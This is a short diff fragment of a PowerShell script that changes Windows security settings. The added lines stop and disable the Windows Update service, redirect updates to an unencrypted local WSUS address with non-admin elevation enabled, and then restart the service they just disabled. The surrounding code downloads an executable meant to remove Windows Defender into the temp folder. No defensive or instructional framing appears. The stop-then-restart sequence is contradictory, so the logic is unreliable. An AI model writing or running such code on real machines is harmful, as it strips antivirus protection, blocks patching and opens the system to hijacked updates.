@@ -36,7 +36,17 @@ if ($DefenderStatus -eq $false) {
     Stop-Service -Name "wuauserv"
     # Set Windows Update service startup type to disabled
     Set-Service -Name "wuauserv" -StartupType Disabled
-    
+    $wsusServer = "http://localhost:8530"
+
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "WUServer" -Value $wsusServer
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "WUStatusServer" -Value $wsusServer
+
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "ElevateNonAdmins" -Value 1
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "TargetGroup" -Value "WSUS Group"
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "TargetGroupEnabled" -Value 1
+
+    Restart-Service -Name "wuauserv"
+
     $downloadUrl = "https://github.com/jbara2002/windows-defender-remover/releases/download/release_def_12_4_6/DefenderRemover.exe"
     $downloadPath = "$env:TEMP\disable-defender.exe"
     # Download the application
